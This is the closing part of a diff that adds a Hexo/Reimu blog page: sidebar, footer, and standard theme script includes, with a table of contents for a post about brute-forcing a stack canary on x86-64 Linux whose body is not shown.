+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2024
+      <span class="footer-info-sep"></span>
+      whoisthatguy
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        10.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:03
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Bruteforce-Stack-Canary-x86-64-Linux"><span class="toc-number">1.</span> <span class="toc-text">Bruteforce Stack Canary x86-64 Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Gioi-thieu"><span class="toc-number">1.1.</span> <span class="toc-text">Giới thiệu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chuong-trinh-khai-thac"><span class="toc-number">1.2.</span> <span class="toc-text">Chương trình khai thác</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bruteforce"><span class="toc-number">1.3.</span> <span class="toc-text">Bruteforce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.5.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/../images/avatar.jpg" data-sizes="auto" alt="whoisthatguy" class="lazyload">
+  <div class="sidebar-author-name">whoisthatguy</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/wh0isthatguy itemprop="url" target="_blank" aria-label="github"></a>
+    </div>
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://twitter.com/im_whoisthatguy itemprop="url" target="_blank" aria-label="twitter"></a>
+    </div>
+  
+    <div class="icon-discord sidebar-social-icon">
+      <a href=https://discordapp.com/users/wh0isthatguy itemprop="url" target="_blank" aria-label="discord"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+
+
+
+<script src="/live2d-widget/autoload.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    quicklink.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
